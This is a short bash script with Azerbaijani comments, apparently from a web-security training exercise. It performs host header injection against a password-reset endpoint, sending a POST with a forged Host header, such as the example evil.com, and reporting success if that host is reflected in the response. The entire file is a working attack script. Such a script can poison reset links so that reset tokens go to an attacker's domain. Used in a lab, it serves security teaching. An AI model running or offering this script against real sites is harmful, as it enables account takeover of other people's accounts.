#!/bin/bash

# 1-host_header_injection.sh

# Argument sayını yoxlamaq
if [ $# -ne 3 ]; then
    echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
    echo "Example: $0 evil.com http://web0x00.hbtn/reset_password email=test@test.com"
    exit 1
fi

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

# Temporary fayl response-u saxlamaq üçün
TEMP_FILE=$(mktemp)

# Host Header Injection ilə request göndər
curl -s -X POST "$TARGET_URL" \
  -H "Host: $NEW_HOST" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$FORM_DATA" \
  -o "$TEMP_FILE"

# Response-u çap et
cat "$TEMP_FILE"

# Yeni host-un response-da olub-olmadığını yoxla
if grep -q "$NEW_HOST" "$TEMP_FILE"; then
    echo -e "\n[+] SUCCESS: Host Header Injection worked! '$NEW_HOST' found in response."
else
    echo -e "\n[-] FAILED: '$NEW_HOST' not found in response."
fi

# Temporary faylı təmizlə
rm -f "$TEMP_FILE"
